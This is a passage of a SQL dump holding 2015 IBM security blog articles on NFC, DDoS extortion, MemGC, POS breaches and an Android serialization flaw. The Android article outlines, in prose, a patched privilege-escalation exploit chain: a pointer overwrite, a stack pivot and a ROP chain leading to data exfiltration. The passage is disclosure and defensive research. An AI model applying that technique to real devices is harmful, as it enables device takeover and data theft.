suspicious emails. These financial institutions should also work closely with their   to lower and contain risks as much as possible.', '\'Banking Trojan\', \'Financial Industry\', \'IBM X-Force Research\', \'Malware\', \'Tinba\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/tinba-trojan-sets-its-sights-on-romania/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (373, 'Ask the Tough Questions About Near-Field Communication Security and Privacy', 'Kevin Beaver', '2015-8-11', 'Near-field communication (NFC) is the short-range communication method that seems to be the next big thing for mobile. This technology allows devices to connect with each other when in close proximity, giving them the ability to transmit data easily. Users with smartphones such as the iPhone 6 and flagship Android devices have this technology available. With the arrival of Google Wallet, Android Pay and Apple Pay, NFC technology allows users to pay at the retail counter via their devices. More and more retailers are responding with NFC readers to help streamline the   process. Being a security guy, I can’t say that it’s all rosy in terms of security- and privacy-related risks. Although an attacker could conceivably reprogram NFC smart tags to embed malware, there are no simple exploits currently published, at least that I’m aware of. The technology also has physical security on its side — i.e., its direction sensitivity and the need for close proximity before communication between devices can be established. That said, there are some   implementations. Stolen phones aside, general considerations that you need to be thinking about include questions such as: Smartphone users can also use NFC to transmit data between phones and read NFC tags — both of which arguably have their own security and privacy concerns. While these aren’t issues many everyday customers may be considering, they’re still concepts that enterprises need to address before implementing NFC and beginning to collect and store sensitive data. Technologies such as NFC are introducing new challenges for enterprises and consumers alike. If your business operates in the retail industry, it’s good to be thinking about how NFC can be exploited in your environment and how information obtained via NFC is handled, stored and retained as part of your business workflows. If anything, it’s yet another data entry/exit point that needs to be brought into the fold of your information security and privacy controls. Furthermore, if you’re like me and a bit paranoid about all of this data collection, how you’re being tracked by outside companies and how it might be used against you in the future, it’s worthwhile to pay attention to this stuff. Near-field communication is only going to grow, and addressing key issues on the ground floor could prevent a lot of headaches — or reputation-shattering data breaches — in the future.', '\'Mobile\', \'Mobile Security\', \'Near-Field Communication (NFC)\', \'Point-of-Sale (POS) Systems\', \'Retail\'', 'https://securityintelligence.com/ask-the-tough-questions-about-near-field-communication-security-and-privacy/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (374, 'One Class to Rule Them All: New Android Serialization Vulnerability Gives Underprivileged Apps Super Status', 'Or Peles', '2015-8-10', 'Over 55 percent of Android phones are at risk of a high-severity serialization vulnerability that   found in the Android platform. In a nutshell, advanced attackers could exploit this arbitrary code execution vulnerability to give a malicious app with no privileges the ability to become a “super app” and help the cybercriminals own the device. In addition to this Android serialization vulnerability, the team also found several vulnerable third-party Android software development kits (SDKs), which can help attackers own apps. We recently saw a similar attack technique exposed as part of the Hacking Team leak. That exploit used a   called BeNews that was built to bypass Google Play’s filtering by requiring a benign set of privileges. Once the user ran the app, it then downloaded additional code with an exploit used to escalate permissions using the Futex vulnerability (CVE-2014-3153). What our team found has not been seen in the wild yet but shows that with the right focus and tools, malicious apps have the ability to bypass even the most security-conscious users. Our team titled the paper “ ” since the single vulnerable class that we found in the Android platform, OpenSSLX509Certificate, was enough to take over the device using our attack technique. Developers take advantage of classes within the Android platform and SDKs. These classes provide functionality for apps — for example, accessing the network or the phone’s camera. The vulnerability we found can be exploited by malware through the communication channel that takes place between apps or services. As the information is broken down and put back together, malicious code is inserted into this stream, exploits the vulnerability at the other end and then owns the device. We are presenting   on this new vulnerability at   in Washington, D.C. This is our third consecutive appearance at WOOT, and as always, we worked closely with the vendors to ensure patches were out before the vulnerability disclosure. The first Android serialization vulnerability (CVE-2015-3825) lies within the Android platform itself, affecting versions 4.3 to 5.1 — or Jelly Bean, KitKat and Lollipop — as well as M Preview 1. This vulnerability impacted more than 55 percent of Android devices at the time of discovery and allowed arbitrary code execution in apps and services on the device. They can be exploited by   installed on the victim’s device. Our paper describes a reliable proof of concept (PoC) that demonstrates the feasibility of the attack. It does not include any exploit code. The PoC exploit we created attacks the highly privileged   process. Exploiting   allows for privilege escalation to the   user with a rather relaxed   profile (due to  ‘s many responsibilities), which enables the attacker to cause a lot of damage. For instance, an attacker can take over any application on the victim’s device by replacing the target app’s Android application package (APK). This can then allow the attacker to perform actions on behalf of the victim. In addition, we were able to run shell commands to exfiltrate data from all applications installed on the device by exploiting the Android Keychain app. We could also change the   policy and, on some devices, also load malicious kernel modules. Below you can find a video demo of our PoC. Once our malware is executed, it replaces a real app with a fake one, allowing the attacker to exfiltrate sensitive data from the app and/or create a perfect phishing attack. We replaced the real Facebook app with a fake one called Fakebook. The other vulnerabilities are in third-party Android SDKs and allow arbitrary code execution in the context of apps that use these SDKs. This executed code can, for example, steal sensitive information from the attacked app. The discovered vulnerabilities are a result of the attacker’s ability to control pointer values during object deserialization in arbitrary apps’ memory space, which is then used by native app code invoked by the runtime’s garbage collector (GC). We extended the   back in 2014. Horn showed that Android allowed deserialization of any class, even non-Java serializable ones, in the context of the attacked app or service leading to remote code execution. Even on a patched system (one that does not allow you to load nonserializable classes), one vulnerable serializable class is enough for a complete takeover. Android apps are sandboxed for security. However, they can interact using messages called Intents, which carry both the destination and the payload. Complex data types must be serialized by the sender and then deserialized by the recipient. In order to ease things for the developer, there is a built-in support for serialization in Java. For example, serialized (and other) objects can be added to the Intent’s extras bundle as follows: The recipient will have a very similar code: Now, due to the way Android works, all of the bundle’s values will be instantiated as soon as any of the bundle’s values is touched. In our example, touching the “foo” member in line six also instantiates our “bar” serializable object. Objects in Java are managed so the developer does not need to care about memory de-allocation done by the GC. In some cases, however, developers do need to react to the GC event. For instance, if the object uses some native (e.g., ARM, x86) code through the Java native interface (JNI), the native, architecture-dependent code may need to free native memory allocations. Another example is an object that creates temporary files, which may want to delete them before it is freed. During the research, we had the following insight: If we found a serializable class that, during its finalize method, freed some native object whose pointer we control (given by a class field), then we could gain code execution in the context of the attacked app or service regardless of the Android patch that was released due to Horn’s discovery. If we found such a class in the Android framework, then it would affect any app or service that touches an incoming bundle, either from Intent or by other Android Interface Definition Language Interprocess Communication (AIDL IPC). If we found such a class in a third-party SDK, it would affect any app that used that SDK. We therefore ran two different experiments. The goal of the first experiment was to find a vulnerable Android framework class available to any application or service. In order to find such a class, we gathered a list of all the loadable classes by parsing the boot.art file found in an Android 5.1.1 Nexus 5 device. We found 13,321 classes that we then scanned using a small Android app that we wrote. The app loads the classes one after another by using Java reflection. For each class, it checks that it: Our code found two classes, only one of which was interesting: OpenSSLX509Certificate. Only a short glimpse at OpenSSLX509Certificate was needed to leave us overwhelmed — I had an attacker-controllable pointer ( ) used in native code during the finalize method! We then dove into the native code, which showed us that we can decrement a positive integer value at an arbitrary address given by the pointer. Chaining the decrements and further optimization described in the research paper allowed us to achieve an arbitrary memory overwrite, a building block used by our PoC exploit. Our PoC exploit uses the fact that all apps and some services, including our malicious process, are forked from the Zygote process. Since all of its forked processes inherit the same memory layout, it makes the address space layout randomization (ASLR) effectively useless. Our exploit targets  . It achieves code execution by overwriting a callback function pointer and then triggering a call to that pointer. This allows us to control the program counter (PC). We point the PC to a gadget that does the Stack-Pivoting technique. Our return-oriented programming (ROP) chain then allocates a memory page as executable, which is allowed as per  ‘s   policy, and copies our payload to that page. We then jump to the payload, which can do a lot of malicious stuff, including: As previously mentioned, vulnerable classes can be found in specific apps or frameworks, implying a more restricted targeted attack. We therefore decided to analyze 32,701 popular Android apps from top developers in order to find such classes. Since using our aforementioned runtime technique to conduct this experiment would take hours to complete, we decided to use a different approach. We created a tool that runs   over the apps’ dex files in a mere 93 minutes. The experiment is so fast because it simply performs a very shallow static analysis, whereas adhering to the previous experiment’s technique would have required installing each app on an Android device — an incredibly slow process. We found a total of 358 classes over 176 APKs that met our criteria (i.e., serializable with a finalize method and an attacker-controllable field). Our analysis had quite a few interesting findings, including 6 vulnerable SDKs: In addition, we found out that the Google Play Services APK also included the vulnerable OpenSSLX509Certificate class. We then wanted to see if these SDKs had something in common. The first five indeed did! They all use SWIG, an interoperability tool that connects C/C++ code with a variety of high-level languages including Java. Under certain developers’ provided configuration, SWIG can generate the following vulnerable code: \nThus, the attacker can control swigCPtr (and swigCMemOwn) since Foo is serializable by proxy (Bar could be serializable) or directly. The swigCPtr is then used in native code. This results in a highly exploitable situation, especially when the original C++ class has a virtual destructor. Our research paper has a more detailed analysis. Google has fixed the two OpenSSLX509Certificate instances by adding the transient modifier to the   member. Google has patched Android 5.1 and 5.0 (commit ID de55e62f6c7ecd57d0a91f2b497885c3bdc661d3) and has also backported the patch to Android 4.4 (commit ID b9d6334acde7460502face82417de40e438a3f4). The patch is also available on Android M (build MPZ79M). We also reported the issues to the relevant SDK vendors or code maintainers who provided patches. Jumio removed the vulnerable SWIG classes, while esri has patched ArcGis Runtime SDK by adding the transient modifier to the native pointer. MyScript and GraceNote fixed their SDKs by adding the transient modifier to the sensitive variables. PJSIP patched PJSUA2 by overriding the readObject/writeObjects methods, effectively making the vulnerable class nonserializable. The MetaIO SDK was fixed as well, as it no longer implements the serializable interface. Since the generated vulnerable code was due to bad configuration given by the developer, we do not consider SWIG to be vulnerable. This is somewhat analogous to blaming a compiler for buffer overflows. However, even the most competent developers could miss the fact that they accidentally extended a serializable class. Therefore, we decided to contact the SWIG team, which released a more secure version, 3.0.7. The patched version generates swigCPtr with the transient modifier. While the patches fixed the specific instances that we had found, we feel that a general problem deserves a general mitigation, reducing the impact of such serialization attacks. Since bundles are very common in Android’s IPC, we suggest changing the bundle’s behavior from one that automatically instantiates all of its values to a lazy approach, such as retrieving only the values of keys it is asked for. By design, the problem will still remain, but it will depend more on specific developers’ code so fewer apps will be at risk if another vulnerable class is found, significantly narrowing the attack surface. In addition, further protection that prevents arbitrary readObject/Replace, writeObject/Replace methods to be called can be achieved by deprecating the current getParcelable and getSerializable methods of both bundle and parcel, and changing the APIs to include the class name of the expected objects. Mitigating exploitation is also possible. First, as explained previously, ASLR is pretty much useless in Android if the attacker can launch malware.   provided a secure replacement for the insecure Zygote implementation. In addition, as our PoC exploit overwrites a function pointer, pointer integrity mechanisms are also possible. One might think that callback pointers must be writable because of their functionality, i.e., they have to be dynamically changed throughout program lifetime; however, this does not have to be the case. One mechanism that solves this problem is keeping the memory area that holds the function pointers to read-only. The memory will become writable by the callback setter functions just for the period of changing the values. A different mitigation approach   proposed white-listing function pointer values and identifying cases where the function pointers are being abused. Another interesting anti-exploitation mitigation is that fields will be transient by default (i.e., an opt-in approach as opposed to the current opt-out). In Android 5.0, the WebView component  , decoupling it from the rest of the system. This had quite a few significant advantages with respect to security. First, it allowed Google to release security patches much faster. Second, it tackled the Android fragmentation problem since patches could be backported for old Android versions and delivered to various devices all at once. We encourage Google to continue its efforts toward decoupling the vendors’ dependent code from the rest of the system so patches will be available much faster. Our case showed the significance of such a separation, as the Google Play Services instance of OpenSSLX509Certificate was updated in multiple Android versions three days after our report. As opposed to vulnerabilities found in final products, such as operating systems or applications where an automatic update mechanism is usually available, the situation is by far worse for SDKs. One vulnerable SDK can affect dozens of apps whose developers are usually unaware of it, taking months to update. For example,   showed that a high-severity   for Android still affected dozens of   even though it had been patched for months. The situation is most frustrating for apps that use orphan SDKs or ones that no longer receive security updates. Developers should be aware that depending on third-party SDKs comes with significant risk. They should prepare for alternatives and choose their SDKs wisely. Developers also deserve better tools. Gradle and its third-party plugin, Gradle Versions Plugin, which notify the developer when a new version is available for a used SDK, are a pretty good start. Or Peles ( ), X-Force Application Security Research Team, IBM Security. Roee Hay ( ), X-Force Application Security Research Team, IBM Security.', '\'Android\', \'Android Vulnerability\', \'Application Security\', \'IBM X-Force Research\', \'X-Force\'', 'https://securityintelligence.com/one-class-to-rule-them-all-new-android-serialization-vulnerability-gives-underprivileged-apps-super-status/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (375, 'Reducing the Application Attack Surface: Breaking Payloads With Runtime Code Stripping and Image Freezing', 'Chris Poulin', '2015-8-6', 'Recently, collaborative research efforts between Northeastern University and IBM devised a means to reduce a Windows application’s attack surface by removing unused functions from libraries that are loaded dynamically, known as Dynamic Link Libraries (DLLs). The researchers will present their findings at  . Most Windows applications perform common functions, such as displaying a message box. Instead of each developer writing this function independently — which would result in incompatibility and an inconsistent user experience — Microsoft delivers multiple predefined libraries with common functions. The same goes for software development platform/compiler manufacturers and application developers. These are packaged as DLLs. DLLs are loaded by applications so that they can use the functions. Even simple applications such as Notepad will load a DLL like User32.dll. Notepad then has access to not just the MessageBox function, but to all other functions contained in User32.dll — even though it will not use many of these capabilities. When an attacker writes an exploit, he or she counts on certain code to exist in memory. For example, the actor may rely on code from the   function of the Windows Socket API to establish a communication channel. Therefore, removing all DLL functions from memory that an application will not use reduces the chances that an exploit will work because it decreases the amount of potentially exploitable code. Collin Mulliner from Northeastern University and Matthias Neugschwandtner from IBM devised a tool that iterates through the DLL function dependencies in an application and determines which functions in loaded DLLs are not needed. The tool then overwrites the unused functions’ code in memory with machine code instructions to stop the program. Since DLLs themselves can call other DLLs, it iterates through the entire load chain. After the tool has stripped unused code, it freezes the code base of the program, i.e., it denies adding or modifying executable memory pages. As a result, attackers can no longer   into the process. It is not simple to determine the recursive library function chain, so in its initial incarnation, the solution requires a training period for each application. The application is executed and the solution monitors its activity for a period to determine which functions are called and which are not. Once an application profile has been created, the solution can be configured to strip unused functions, effectively moving from training to protection mode. There is no runtime overhead after program startup, when stripping and freezing actually take place. Stripping and freezing is also a memory-only operation and does not affect the DLLs on disk. It only affects memory consumption since DLL code pages are stripped individually per application and can thus no longer be shared among multiple processes. But if you ask us, this is a fair trade-off for  . To learn more, attend the   Aug. 6 at 3:50pm in South Seas IJ.', '\'Application Security\', \'Black Hat\', \'Black Hat USA\', \'Vulnerabilities\', \'Windows\'', 'https://securityintelligence.com/reducing-the-application-attack-surface-breaking-payloads-with-runtime-code-stripping-and-image-freezing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (376, 'Are These Airline Hacks Related?', 'Charles Kolodgy', '2015-8-6', 'Organizations are beginning to change the way they handle the revelation that their IT systems have been attacked. In a rare public admission, LOT, the Polish national airline,   on June 21, 2015, that 20 flight cancellations and delays were the direct result of an IT attack. Initially, the airline released a statement that the flight problems were caused by an IT systems failure. However, shortly thereafter, it issued a second press release that stated that the cancellations and delays were the direct result of hacks of the ground operations system. The hack prevented the creation of flight plans for planes scheduled to depart Warsaw Chopin Airport. The airline has not shared information on the full nature of the attack. This raises echoes of what has happened recently at United Airlines. There was an hourlong grounding of all United Airline flights on the morning of June 2. According to  , the reason for the delays in this case was stated as “faulty flight information in the airline’s dispatch system,” which was blamed on “automation issues.” There was some speculation on Twitter that attributed the grounding to hacks issuing false and random flight plans. On the morning of July 8, United Airlines suffered another “ ” that grounded thousands of flights for nearly two hours. Then, on July 29, 2015,   published additional information on alleged hacking tied to United Airlines. Bloomberg Business reported that the airline “detected an incursion into its computer systems in May or early June.” United declined to comment on whether there was a potential breach, but the article stated that the stolen data allegedly included flight manifests. It also cited an unidentified source who stated that there is no evidence that the July 8 flight delays were caused as a result of hacks, but the sources wouldn’t “rule out a possible, tangential connection” to the June 2 event. These events may or may not be related — there just isn’t enough information being shared to make that determination. The outward appearance is that the problems these airlines had were not related: They occurred weeks apart in different parts of the world across different systems — but that may not be the case. What is known is that LOT announced that its problem was the result of an outside actor and not just a simple system failure. Regarding the   incidents, people continue to speculate on what caused the system malfunctions and whether United actually was hacked. While we don’t know exactly what caused these incidents, we can assert that threat intelligence and information sharing can greatly improve awareness and aid in hardening defenses against emerging threats. To efficiently defend against security threats, organizations require visibility into the origins, variations and methods of attack. They must also be aware of their own vulnerabilities. Through investigation and information sharing, a determination could be made on whether incidents such as this are isolated or related, and whether other airlines could take steps to prevent them. Cyberattacks are becoming more dynamic, more complex and more malicious. Additionally, cybercriminals are sharing information about targets and vulnerabilities, and they are soliciting advice from others in their nefarious communities. Reducing risk in this environment requires that security professionals have comprehensive threat intelligence. Some of the most critical information will need to be provided by other security specialists. In short, security analysts need to collaborate to stop the bad guys. One tool that organizations can utilize to augment their internal threat research is the  . X-Force Exchange is an open, cloud-based threat intelligence sharing platform. IT security professionals that participate have access to the 700 TB of data that X-Force has amassed from the analysis of more than 15 billion security events, billions of Web pages, millions of spam and phishing attacks and a malware threat intelligence network of 270 million endpoints. The content includes malware information and IP reputation (e.g., malware hosts, spam sources, botnet command-and-control servers), URL reputation, Web application categorization such as information on threats originating from specific software, exploits and vulnerability tracking. As a cloud platform, the data is continuously updated with the latest intelligence. Users can collect reports that they can then export into their own incident response, forensics investigation or analytics platform using the Exchange’s social-based user interface or the application programming interface (API). To be successful, IT security must reduce the attack surface area, have visibility into threats and reduce reaction time. These activities can be enhanced with  , which is expanded in scope by the sharing of information across industries and organizations. By pooling vulnerability and threat data, IT security professionals vastly improve their ability to detect, divert and avoid threats. In the future, organizations throughout the airline industry may be able to avoid hacker-created travel delays if they increase their collaboration on threats, attack methods and system vulnerabilities. IBM X-Force Exchange is a new platform to share threat intelligence, and as more entities join the Exchange, its vault of intelligence will increase, helping prepare organizations for the next potential incident.', '\'Cybersecurity\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Information Sharing\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/are-these-airline-hacks-related/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (377, 'Attacker Demands $15,000 Ransom for Stolen Customer Credentials', 'Dana Tamir', '2015-8-5', 'A cybercriminal going by the name   claims to have stolen some of the login credentials of Bitdefender’s users and threatened to release the details if $15,000 is not paid as ransom. The attacker told   that all information, including passwords and usernames, was unencrypted. The antivirus software provider Bitdefender confirmed that customer login credentials were obtained by the attacker but stated that a very limited number of usernames and passwords has been exposed. Their spokesperson stated that the attack did not penetrate the server, but “a vulnerability potentially enabled exposure of a few user accounts and passwords.” The attack leaked a “very limited” number of usernames and passwords — less than 1 percent of Bitdefender’s small and medium business customers, according to the spokesperson. These days, most targeted attacks make use of stolen credentials. Fraud expert   wrote earlier this year that “password compromise is the most common way bad guys get into our accounts.” She continued, “Over the past couple of months, Gartner clients have been telling us [Gartner] about the significant rise in automated attacks, whereby hackers use bot armies to run through user credentials at various consumer service websites, knowing that a few percent of them will probably work.” According to a Gartner survey conducted several years ago, over two-thirds of consumers   across sites whenever they can. Many employees reuse their corporate passwords for accessing personal online services and applications. This is a dangerous practice because, if stolen or exposed to others, that single password can provide access to multiple systems and sites. Furthermore, cybercriminals know this, which is why even seemingly innocuous credentials are so valuable to them. To minimize risk, it is imperative that, in addition to education programs, organizations enforce   policies that require employees to use different passwords for accessing corporate resources and noncorporate online services. This can easily be achieved with   that can automatically alert on and optionally prevent password reuse by employees. As this breach demonstrates, exposed or stolen credentials can have a far-reaching impact, both on the source from which they were stolen and the customers that may now be exposed. Can’t get enough ransomware stories? Read more about the   and its older cousin,  .', '\'Credentials\', \'Credentials Theft\', \'Cybercrime\', \'Extortion\', \'Password\', \'Stolen Credentials\'', 'https://securityintelligence.com/attacker-demands-15000-ransom-for-stolen-customer-credentials/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (378, 'Epic Hacks and High Jinks at Black Hat', 'Fran Howarth', '2015-8-4', 'Now in its 18th year, one of the original concepts behind   was “meet the enemy,” as corporate executives and hackers come face to face to discuss the goings-on in the security industry. Its mission has shifted slightly, and today, Black Hat is renowned as a place to get up to speed on the latest research, learn about new threat vectors and brush up on techniques for thwarting attacks. It is also famous for highlighting audacious hacks and attacks on a variety of devices and for the high jinks and pranks that attendees get up to. A number of epic hacks presented tend to draw in the crowds. Some of the most famous have been the hacking of   and medical devices. One savvy mind even went so far as to hack the hotel locks made by a manufacturer with a 50 percent share of the market. At last year’s conference, a researcher showed how to hack into the satellite communications equipment of   through their Wi-Fi and in-flight entertainment systems. It was also the year of hacks against Internet of Things (IoT) devices, dubbed the Internet of hackable things. Among the demonstrations was the hacking of smart televisions, vehicles and even a smart toilet. Such hacks are certainly a draw for attendees, and researchers will save their best for Black Hat. However, it is considered most ethical to warn manufacturers beforehand so that they have time to implement fixes before the   go public. Even with these considerations, some hacks are considered too controversial, and it’s not uncommon for presentations to be canceled at the last minute. But it is not only the high-profile hacks that put Black Hat on the map. It is also known for the high jinks that go on, often exposing lax security practices among attendees.   reported that during Black Hat USA 2014, traffic from hacking attacks originated in Las Vegas spiked at 130 times the normal amount seen, rising to 2,612 attacks at the peak. After the conference, the attack rate returned to normal. But many of the victims were left behind to reimagine their defenses and prepare for the following year. Conference hosts, for example, are frequently subjected to high jinks beyond the demonstrated hacks of   and ATMs. In terms of the hotel facilities, hacked commodities have included streaming media services, allowing the presentations to be viewed for free; VoIP systems, which allowed free calls to be made; and other services such as the pay TV system. Attendees also need to exercise caution and make sure that things are sufficiently locked down. There are a number of steps individuals can take to  , including avoiding unsecured Wi-Fi networks and using Mi-Fi devices to create their own personal hotspots. Visitors should never leave valuables in hotel rooms, even in safes, and they should ensure they have enough cash on them to get through the event. No report has ever said that Black Hat was boring. The number of epic hacks presented and high jinks perpetrated has increased along with the size and breadth of the conference. If you take the proper precautions before attending, you can enjoy the fun without becoming a victim yourself.', '\'Black Hat\', \'Black Hat USA\', \'Hacking\', \'Internet of Things (IoT)\', \'Security Conferences\'', 'https://securityintelligence.com/epic-hacks-and-high-jinks-at-black-hat/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (379, 'DDoS Extortion: Ransomware’s Older Cousin', 'Michelle Alvarez', '2015-8-4', 'Ransomware has received a lot of attention recently, but an older threat — extortion by threat of distributed denial-of-service (DDoS) attacks — also demands our focus. By making servers or services unavailable, DDoS attacks can be crippling to both an organization’s finances and its brand reputation. DDoS attacks can be simple or sophisticated, but they’re calculated nonetheless and are usually profit-driven. They can also be used to cover up something more sinister, as seen with the  . Adding the element of extortion to this type of attack only magnifies the gravity of the situation and the potential financial loss to the targeted organization. Not all   run the same course, but several publicly announced incidents have had similar characteristics. Extortionists often illustrate their capabilities by performing a small attack such as shutting down a website for 15 minutes via a volumetric attack. This is followed by an email requesting that the victims pay a monetary sum within a certain period of time — say, 24 hours — or face more attacks.\n Ransom notes are often candid, intimidating and designed to coerce companies to pay up — quickly. The instructions are clear, the threat is evident and time is usually limited to further increase the exigency of the threat. If the ransom is not paid within the specified period of time, the attackers often follow through on their promise of additional attacks. What do you do? To pay or not to pay? That is the question.\n \n Extortionists are diversifying their targets. DDoS extortion attacks have been primarily a concern for small Web-based companies, gambling websites and virtual currency-based businesses. However, there is evidence that attackers are broadening their scope and diversifying their targets to include different industry sectors, regions and larger organizations. In May of this year, two of the largest banks in Hong Kong were   that were followed by a note demanding payment. These attacks are suspected to be the work of extortionist hacker group DD4BC. A DDoS attack can be difficult to deflect without   in place simply because there is no single attacker to defend from; the targeted resource is flooded with requests from many hundreds or thousands of multiple sources. During an attack, organizations may experience significant increases in page load times, transactions could fail or services could be made completely unavailable. Organizations with a multifaceted approach will be better equipped to defend against volume-based, protocol-based and application-based DDoS attacks. Companies should develop a plan that is both proactive and responsive, placing them in a position to effectively defend against DDoS attacks. The alternative is to negotiate with the attackers and pay up — potentially leading to future extortion attempts. There are multiple ways to proactively prevent DDoS attacks. For recommendations, refer to the research paper “ .”', '\'Advanced Threats\', \'Distributed Denial-of-Service (DDoS) Attacks\', \'Ransomware\', \'Threat Intelligence\', \'Threat Protection\'', 'https://securityintelligence.com/ddos-extortion-ransomwares-older-cousin/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (380, 'MemGC: Use-After-Free Exploit Mitigation in Edge and IE on Windows 10', 'Mark Yason', '2015-8-3', 'In my recent   talk on the attack surface and exploit mitigations in EdgeHTML (Microsoft Edge’s new rendering engine), one of the topics that I discussed was  , a new and improved use-after-free (UAF) exploit mitigation introduced by Microsoft in Edge and IE on Windows 10. MemGC was first introduced in Edge’s EdgeHTML rendering engine and in IE’s Trident (MSHTML) rendering engine on Windows 10. It is the successor to the   UAF exploit mitigation in the aforementioned rendering engines on Windows 10. Similar to Memory Protector, the purpose of MemGC is to mitigate exploitation of UAF   by preventing the freeing of memory chunks if references to them are found. However, unlike Memory Protector, which only checks the registers and the stack for chunk references, MemGC also scans the contents of MemGC-managed chunks for references. This additional check means that MemGC further decreases the number of usable UAF bugs that an attacker can exploit. MemGC is enabled by default. One way to configure it in both Edge and IE is via the   configuration, which can be set via the following registry entry: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main::OverrideMemoryProtectionSetting =  Where   can be any of the following: MemGC uses a separate managed heap (called the MemGC heap) for object allocation, as well as a concurrent garbage collector that performs a mark-and-sweep operation to automatically identify and reclaim unreferenced chunks in the MemGC heap. MemGC depends on the Chakra JavaScript engine memory management routines for most of its functionality. The allocation scheme used involves committing chunks of memory called   using   and then dividing these   into 4096-byte  . A group of these   are then treated as a   which is in turn used in the allocation of similarly sized objects. EdgeHTML/MSHTML DOM objects and many internal rendering engine objects are managed by MemGC. And because MemGC already uses a separate managed heap, the Isolated Heap is unused if MemGC is enabled. In EdgeHTML’s implementation of MemGC, when a MemGC-managed object needs to be allocated,   or   is called, which in turn calls   will then allocate a chunk from a   in the appropriate bucket and then flag the chunk as a root. In garbage collection parlance, root means that the object is directly referenced by the program and therefore should not be garbage-collected. Root chunks are also used by the garbage collector when scanning for chunk references. When an object is to be freed,   is called, which in turn calls  . C  attempts to locate the   where the object’s chunk is, zero-out the chunk and then clear the root flag of the chunk. By clearing the root flag, the chunk will become a candidate for garbage collection and will be reclaimed if no references to it are found by the garbage collector (more on this below). Once the total size of the unrooted chunks reaches a dynamically computed threshold value, garbage collection will be triggered via  . The garbage collection — a complicated process of which only the core functions are described here — will perform a mark-and-sweep operation to reclaim unreferenced unrooted chunks. Some parts of the mark-and-sweep operation are executed on a separate thread ( ), which is notified via  . In the marking phase, the mark bit for all chunks is first cleared and all root chunks are marked (via  ). Then the root chunks (via  ), registers and stack (via  ) are scanned for chunk pointers. Referenced chunks found in the scan are marked. Chunks that are not marked after the marking phase will eventually be made available for reallocation. Similar to Memory Protector, MemGC will further reduce the number of exploitable   vulnerabilities in Edge and IE. However, MemGC is also a complex mechanism with a custom heap management and garbage collection scheme. Attackers take advantage of complexity by looking at   vectors that had been inadvertently introduced or attack   that were unwittingly made possible. Needless to say, MemGC deserves scrutiny to identify and eventually improve its potential weaknesses. As mentioned at the start of this blog post, MemGC is one of the topics recently discussed in my Black Hat USA  2015 presentation. If you are interested in understanding the attack surface and exploit mitigations in EdgeHTML, please check out my   and watch this video with my colleague  . For an even deeper dive into the subject, please download my  , Understanding the Attack Surface and Attack Resilience of Project Spartan’s (Edge) New EdgeHTML Rendering Engine.', '\'Exploit\', \'Internet Explorer (IE)\', \'Microsoft\', \'Use-After-Free (UAF) Vulnerabilities\'', 'https://securityintelligence.com/memgc-use-after-free-exploit-mitigation-in-edge-and-ie-on-windows-10/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (381, 'The Top Ways Cybercriminals Infiltrate Retailers’ Systems and Steal Customer Data', 'Kevin Beaver', '2015-7-31', 'You may have heard an iconic line attributed to infamous bank robber Willie Sutton: When asked why he robbed banks, he responded by saying “because that’s where the money is.” Here we are in 2015, and the story is no different regarding the security of point-of-sale (POS) systems in retail environment. Criminals seek out these systems because they know that’s where they can gain access to a large number of records of customer data, specifically credit and debit card information.\n Here are two common attack vectors and some details on what can be done to keep such systems mostly immune from attack:\n RAM-scraping malware that extracts magnetic stripe data directly out of the POS computer’s memory is the biggest concern facing retailers. This malware can be installed by an attacker who has gained access to the network via other means (such as compromised credentials, as in the case of the Target breach) or even social engineering. Given the open nature of retail environments and the high turnover rate of employees, there are other possible attack avenues, as well, such as the installation of malware directly onto the POS system via a thumb drive.\n There are plenty of big-box retailers running highly vulnerable and   and Windows 2003 servers at this very moment. That’s not necessarily bad in and of itself, as long as there are compensating controls such as   and positive security white-listing systems that control what runs on the registers.\n An attacker connecting the POS environment via an unsecured wireless network is a common attack. Once a foothold is gained, odds are that numerous patches are missing, offering flaws that can be exploited using a tool such as Metasploit. Again, retail systems often involve legacy programs or machines, which put them at risk. The last thing that any self-respecting system admin or retail software vendor will allow is the installation of service packs, hot fixes and related patches. With the risk of system outages due to risky software updates, there’s simply too much lose. Or is there?\n It’s not uncommon for large amounts of cardholder data to end up in an unstructured fashion on mobile devices (e.g., in spreadsheet files, PDFs and the like), often unprotected in the event of loss or theft. I’ve heard plenty of stories about auditors, contractors and even software developers who have such data in their possession. All it takes is one car being broken into or one bag being lost at the airport to make a   reality.\n The solution? Encrypt laptops, phones, tablets and any other mobile storage media. Given all the hands in the pie in large retail enterprises, encryption is likely not enough. A proven control that can really help lock down cardholder data is a data loss prevention (DLP) measure, which keeps the data from ever leaving its secure location to begin with.\n If it’s not one of the above items exposing critical systems and sensitive information, odds are very good that it will be some other   such as a weak password or physical security vulnerability. There’s always a chance that other unrelated corporate systems and applications can be breached, leading to the exposure of cardholder data. Of course, there are third-party vendors with all of their network systems and applications that you have to consider, as well. As we saw in the Target breach, all it takes is one vendor that’s not all that security-savvy to lead to a world of hurt.\n There are additional security measures retailers can use to lock down their vulnerable POS environments. These include:\n In the end, if people looking to commit such crimes against retailers really want in, they’re going to find a way. It’s up to retailers to make their systems as secure as possible. The thing that makes it so difficult is that the criminals have nothing but time; those working in IT and security for retailers don’t. But with periodic system upgrades, consistent security evaluations and open communication among involved parties, secure customer data can be closer than ever before.', '\'Point-of-Sale (POS) Systems\', \'POS Malware\', \'Retail\', \'Retail Security\', \'Threat Intelligence\'', 